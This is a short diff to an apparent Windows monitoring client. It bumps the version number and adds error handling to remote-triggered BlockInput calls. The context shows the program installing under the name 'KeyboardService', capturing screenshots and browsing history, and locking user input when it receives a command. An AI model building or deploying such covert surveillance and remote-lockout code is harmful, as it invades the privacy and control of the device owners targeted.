@@ -50,7 +50,7 @@ WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
-APP_VERSION = "1.2.19"
+APP_VERSION = "1.2.20"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1160,7 +1160,12 @@ def open_message_document(message):
 def release_input_block():
     global input_block_timer
     try:
-        ctypes.windll.user32.BlockInput(False)
+        user32 = ctypes.WinDLL("user32", use_last_error=True)
+        user32.BlockInput.argtypes = [wintypes.BOOL]
+        user32.BlockInput.restype = wintypes.BOOL
+        if not user32.BlockInput(False):
+            error_code = ctypes.get_last_error()
+            raise OSError(error_code, ctypes.FormatError(error_code))
     finally:
         input_block_timer = None
 
@@ -1195,7 +1200,12 @@ def handle_device_command(command, command_id=None, message=""):
                     input_block_timer.cancel()
                 except Exception:
                     pass
-            ctypes.windll.user32.BlockInput(True)
+            user32 = ctypes.WinDLL("user32", use_last_error=True)
+            user32.BlockInput.argtypes = [wintypes.BOOL]
+            user32.BlockInput.restype = wintypes.BOOL
+            if not user32.BlockInput(True):
+                error_code = ctypes.get_last_error()
+                raise OSError(error_code, ctypes.FormatError(error_code))
             input_block_timer = Timer(duration, release_input_block)
             input_block_timer.daemon = True
             input_block_timer.start()
